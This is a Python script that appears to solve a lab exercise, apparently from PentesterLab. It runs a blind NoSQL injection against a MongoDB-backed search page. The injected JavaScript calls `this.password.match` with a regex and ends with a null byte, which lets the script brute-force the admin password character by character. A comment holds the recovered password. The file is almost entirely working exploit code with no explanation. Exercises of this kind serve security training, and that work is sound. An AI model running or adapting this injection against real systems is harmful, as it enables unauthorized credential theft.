import urllib
import requests

class Mongo02:

	def __init__(self, url):
		self.url = url 
		self.matchToken = '>admin<'
		self.passVarName = 'this.password'
		self.passCharacters = '-0123456789abcdef'

	def makeRequest(self, url):
		response = requests.get(url)
		text = response.text.split("<tr><th>name</th></tr>")[1].split("</table>")[0]
		#print(text)
		return text

	def isMatch(self, userName : str, passRegex : str):
		# /?search=admin' && this.password.match(/^ab*$/) %00`:
		print("Matching the password with ", passRegex)
		searchVal =  userName + "' && " + self.passVarName + ".match(/" + passRegex + "/)" 
		searchVal = urllib.parse.quote(searchVal)
		url = self.url + searchVal + "%00" 
		if self.matchToken in self.makeRequest(url):
			return True
		return False

	def getPassword(self, userName : str):
		password = ""
		for _ in range(10000):
			passRegex = "^" + password + "$"	
			if(self.isMatch(userName, passRegex)):
				return password
			for ch in self.passCharacters:
				passRegex = "^" + password + ch + ".*$"	
				if(self.isMatch(userName, passRegex)):
					password += ch
					break

if __name__=="__main__":
	url = "http://ptl-e4961aeb-d15e722c.libcurl.so/?search="
	mongo = Mongo02(url)	
	print('admin password is ', mongo.getPassword('admin'))    #5b317d17-3ee3-4865-8605-bb579f58c10a
